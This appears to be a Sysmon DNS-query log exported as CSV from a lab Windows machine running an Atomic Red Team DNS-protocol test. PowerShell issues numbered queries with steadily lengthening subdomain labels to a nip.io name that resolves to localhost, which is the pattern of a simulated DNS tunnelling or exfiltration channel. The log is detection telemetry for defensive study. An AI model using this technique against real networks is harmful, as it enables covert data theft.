"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175295,"Query: 102.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteam.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.410","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175296,"Query: 103.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteama.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.454","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175297,"Query: 104.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamat.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.492","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175298,"Query: 105.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamato.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.530","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175299,"Query: 106.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatom.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.568","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175300,"Query: 107.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomi.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.606","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:55.937 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175301,"Query: 108.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomic.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.659","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:56.940 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175302,"Query: 109.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicr.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:55.696","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:56.940 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175303,"Query: 110.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicre.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.024","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:56.940 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175304,"Query: 111.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicred.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.062","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:56.940 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175305,"Query: 112.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredt.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.100","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:56.940 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175306,"Query: 113.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredte.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.289","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:56.940 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175307,"Query: 114.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredtea.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.327","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:56.940 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175308,"Query: 115.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteam.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.365","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:56.940 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175309,"Query: 116.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteama.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.688","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:56.940 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175310,"Query: 117.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamat.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.726","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:56.940 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175311,"Query: 118.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamato.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.765","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175312,"Query: 119.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatom.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.804","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175313,"Query: 120.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomi.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:56.842","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175314,"Query: 121.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomic.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.166","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175315,"Query: 122.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicr.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.204","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175316,"Query: 123.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicre.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.244","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175317,"Query: 124.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicred.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.286","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175318,"Query: 125.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredt.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.324","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175319,"Query: 126.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredte.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.368","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175320,"Query: 127.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredtea.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.406","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175321,"Query: 128.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteam.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.444","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175322,"Query: 129.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteama.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.482","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175323,"Query: 130.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamat.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.521","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175324,"Query: 131.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamato.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.560","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:57.955 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175325,"Query: 132.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatom.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.598","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175326,"Query: 133.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomi.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.636","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175327,"Query: 134.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomic.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.959","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175328,"Query: 135.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicr.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:57.998","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175329,"Query: 136.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicre.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.037","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175330,"Query: 137.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicred.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.076","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175331,"Query: 138.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredt.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.114","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175332,"Query: 139.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredte.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.151","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175333,"Query: 140.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredtea.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.323","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175334,"Query: 141.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteam.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.361","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175335,"Query: 142.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteama.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.399","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:58.956 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",175336,"Query: 143.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamat.a.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9872 ¦ PGUID: E9F06A57-639D-694E-5D02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:29:58.436","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
